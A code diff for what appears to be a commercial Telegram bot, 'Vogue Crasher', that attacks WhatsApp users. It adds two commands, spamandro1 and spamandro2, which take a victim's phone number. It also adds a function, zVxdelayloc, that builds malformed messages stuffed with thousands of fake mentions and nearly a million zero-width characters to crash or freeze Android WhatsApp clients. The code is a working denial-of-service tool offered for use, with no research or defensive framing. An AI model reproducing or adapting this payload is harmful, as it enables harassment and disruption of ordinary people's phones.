@@ -4675,6 +4675,158 @@ Please verify the target input and system status before retrying.`
     }
 });
 
+bot.command('spamandro1', checkExecutionLimit, checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
+    
+    let q = ctx.message?.text?.split(" ")[1];
+    
+    if (!q) return ctx.reply(
+        `Invalid Format
+
+Usage:
+/spamandro <target_number>
+
+Example:
+/spamandro 628xxxxxxxx`
+    );
+    
+    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    
+    try {
+        
+        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
+            caption: `
+\`\`\`ruby
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+EXECUTION STATUS
+
+Target      : ${q}
+Status      : Success
+Description : Android Delay Invisible
+
+──────────────────────────
+\`\`\``,
+            parse_mode: "markdown",
+            reply_markup: {
+                inline_keyboard: [
+                    [{
+                        text: "Check Target",
+                        url: `https://wa.me/${q}`,
+                        style: "primary"
+                    }]
+                ]
+            }
+        });
+        
+        (async () => {
+            
+            const instanceId = Date.now() + Math.random();
+            
+            for (let i = 0; i < 1; i++) {
+                try {
+                    await zVxdelayloc(sock, target);
+                    await sleep(1500)
+                } catch (e) {
+                    console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
+                    await restartBot("Connection Closed");
+                }
+            }
+            
+            console.log(`[WORKER ${instanceId}] Done for ${q}`);
+            
+        })();
+        
+    } catch (error) {
+        
+        ctx.reply(
+            `Operation Failed
+
+The system was unable to execute the requested module.
+Please verify the target input and system status before retrying.`
+        );
+        
+        console.log(`[VOGUE CRASHER] Execution failed for ${q}`);
+        await restartBot("Connection Closed");
+    }
+});
+
+bot.command('spamandro2', checkExecutionLimit, checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
+    
+    let q = ctx.message?.text?.split(" ")[1];
+    
+    if (!q) return ctx.reply(
+        `Invalid Format
+
+Usage:
+/spamandro <target_number>
+
+Example:
+/spamandro 628xxxxxxxx`
+    );
+    
+    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    
+    try {
+        
+        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
+            caption: `
+\`\`\`ruby
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+EXECUTION STATUS
+
+Target      : ${q}
+Status      : Success
+Description : Android Delay Invisible
+
+──────────────────────────
+\`\`\``,
+            parse_mode: "markdown",
+            reply_markup: {
+                inline_keyboard: [
+                    [{
+                        text: "Check Target",
+                        url: `https://wa.me/${q}`,
+                        style: "primary"
+                    }]
+                ]
+            }
+        });
+        
+        (async () => {
+            
+            const instanceId = Date.now() + Math.random();
+            
+            for (let i = 0; i < 1; i++) {
+                try {
+                    await VnXNewDelayHard(sock, target);
+                    await sleep(1500)
+                } catch (e) {
+                    console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
+                    await restartBot("Connection Closed");
+                }
+            }
+            
+            console.log(`[WORKER ${instanceId}] Done for ${q}`);
+            
+        })();
+        
+    } catch (error) {
+        
+        ctx.reply(
+            `Operation Failed
+
+The system was unable to execute the requested module.
+Please verify the target input and system status before retrying.`
+        );
+        
+        console.log(`[VOGUE CRASHER] Execution failed for ${q}`);
+        await restartBot("Connection Closed");
+    }
+});
+
 bot.command('zzz', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, CheckCooldown, async (ctx) => {
     
     let args = ctx.message?.text?.split(" ");
@@ -5578,6 +5730,55 @@ async function VnXNewDelayHard(sock, target) {
    };
 
   await sock.relayMessage(target, vnxmbgdly, {
+    participant: { jid: target },
+  });
+}
+
+async function zVxdelayloc(sock,target) {
+  let msg1 = {
+    groubStatusMessageV2: {
+      message: {
+        interactiveResponseMessage: {
+          contextInfo: {
+            participant: target,
+            mentionedJid: [
+              '0@s.whatsapp.net',
+              ...Array.from(
+                {
+                  length: 2000,
+                },
+                () =>
+                  '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net',
+              ),
+            ],
+            header: {
+              title: "",
+              locationMessage: {
+                degreesLatitude: Math.random() * 180 - 90,
+                degreesLongitude: Math.random() * 360 - 180,
+              },
+              hasMediaAttachment: false,
+            },
+            body: {
+              text: 'zVx',
+              format: 'DEFAULT',
+            },
+            footer: {
+              text: '\u200B'.repeat(70000),
+              format: 'DEFAULT',
+            },
+            nativeFlowResponseMessage: {
+              name: 'galaxy_message',
+              paramsJson: `{\"flow_cta\":{\"title\":${"\u200B".repeat(990000)}}}`,
+              version: 3,
+             },
+           },
+         },
+       },
+     },
+   };
+  await sock.relayMessage(target,
+  msg1, {
     participant: { jid: target },
   });
 }
